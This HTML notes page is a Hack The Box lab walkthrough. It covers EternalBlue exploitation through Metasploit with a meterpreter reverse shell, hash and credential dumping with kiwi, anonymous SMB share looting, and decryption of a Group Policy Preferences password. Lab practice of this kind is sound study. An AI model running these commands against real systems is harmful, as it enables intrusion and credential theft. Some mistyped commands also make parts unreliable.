<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>ms17-010</title>
</head><body><b><span style="font-size: 18pt">'Active' machine in hack the box</span></b><br/>
<br/>
<span style="color: #ff0000">nmap -Pn -p445 --script=smb-vuln-ms17-010 10.10.10.40</span>&nbsp;scan to see if it is vulnerable to the exploit of ms17-010<br/>
<span style="color: #ff0000">msfconsole</span>&nbsp;metasploit<br/>
<span style="color: #ff0000">search ms17-010</span><br/>
<span style="color: #ff0000">use exploit/windows/smb/m17_010_eternalblue</span><br/>
<span style="color: #ff0000">options</span><br/>
<span style="color: #ff0000">set rhosts 10.10.10.40</span><br/>
<span style="color: #ff0000">run</span>&nbsp;(it may not run on the first try, you need to run it more than once)<br/>
<span style="color: #ff0000">options</span>&nbsp;to see the payload options now<br/>
<span style="color: #ff0000">show payloads</span>&nbsp;to see the available payloads<br/>
<br/>
<br/>
<br/>
<span style="color: #ff0000">set payload windows/x64/meterpreter/reverse_tcp</span><br/>
<span style="color: #ff0000">options</span>&nbsp;to check the options for payload, you need to set LHOST and LPORT if those get reset for some reasons<br/>
<span style="color: #ff0000">run</span>&nbsp;(it may not run on the first try, you need to run it for more than once)<br/>
<br/>
<br/>
<span style="color: #ff0000">sysinfo</span>&nbsp;to check the meterpreter shell and also the architecture of the machine<br/>
<span style="color: #ff0000">hashdump</span>&nbsp;for dumping all the hashes<br/>
<span style="color: #ff0000">shell </span>to see the shell of the system (get into the shell)<br/>
<span style="color: #ff0000">cd c:\users</span>&nbsp;to see the users<br/>
<span style="color: #ff0000">dir </span><br/>
<span style="color: #ff0000">cd administrator</span><br/>
<span style="color: #ff0000">dir</span>&nbsp;to see the folders and file in the administrator<br/>
<span style="color: #ff0000">arp -a</span>&nbsp;to look at the arp table<br/>
<span style="color: #ff0000">route print</span>&nbsp;to see the route table<br/>
<span style="color: #ff0000">netstat -ano</span>&nbsp;to look at all the connections<br/>
<br/>
<br/>
<br/>
<b><span style="font-size: 18pt">Incognito<br/>
</span></b><br/>
For loading extra module like incognito<br/>
<span style="color: #ff0000">load incognito<br/>
</span><span style="color: #ff0000">list_tokens -u</span><br/>
<span style="color: #ff0000">load kiwi</span>&nbsp;(it is newer and better than mimikatz which runs on 32bit architecture)<br/>
<span style="color: #ff0000">creds_all</span><br/>
<span style="color: #ff0000">help</span>&nbsp;to look at the kiwi commands<br/>
<span style="color: #ff0000">wifi_list</span><br/>
<br/>
<br/>
(look through ldap it is very difficult to get into without credentials and also look through the ports 445 and 139)<br/>
<br/>
<br/>
<b><span style="font-size: 18pt">SMB Client Tool<br/>
<br/>
</span></b><span style="color: #ff0000">smbclient -L \\\\10.10.10.100\\ </span>&nbsp;this is the ip of the domain controller<br/>
press<span style="color: #ff0000">&nbsp;enter </span>if asks for password<br/>
<span style="color: #ff0000">smbclient -L \\\\10.10.10.100\\ADMIN$</span><br/>
press <span style="color: #ff0000">enter</span>&nbsp;if asks for password (but the access might be denied)<br/>
<span style="color: #ff0000">smbclient -L \\\\10.10.10.100\\Replication</span>&nbsp;(this works in the active machine of hack the box)<br/>
press <span style="color: #ff0000">enter</span>&nbsp;if asks for password<br/>
<span style="color: #ff0000">help</span>&nbsp;to see the list of commands that can be used<br/>
<span style="color: #ff0000">RECURSE ON</span>&nbsp;(once you get inside with smb client this command will ensure download all the folder recursively)<br/>
<span style="color: #ff0000">PROMT OFF</span><br/>
<span style="color: #ff0000">mget *</span>&nbsp;this will download all the folders and files<br/>
<span style="color: #ff0000">ctrl + c</span>&nbsp;to get out of the smbclient<br/>
open the <span style="color: #ff0000">group.xml</span>&nbsp;file from the gui like file manager in Downloads folder (GPP -&gt; Group Policy Preferences)<br/>
<br/>
<br/>
__________________________________________________________________________________________________________________________________________________________<br/>
<span style="font-size: 18pt"><b>Metasploit module to find the group policy preferences if that cannot be found with smbclient<br/>
</b></span><span style="color: #ff0000">msfconsole<br/>
search gpp<br/>
use post/windows/gather/credentials/gpp<br/>
</span><span style="color: #ff0000">options</span>&nbsp;for getting a hint about the methods and items to be set<br/>
__________________________________________________________________________________________________________________________________________________________<br/>
<br/>
<br/>
<br/>
<span style="color: #ff0000">gpp-decrypt "paste the c-password from group.xml"</span><br/>
get the cypher running gpp-decrypt <br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>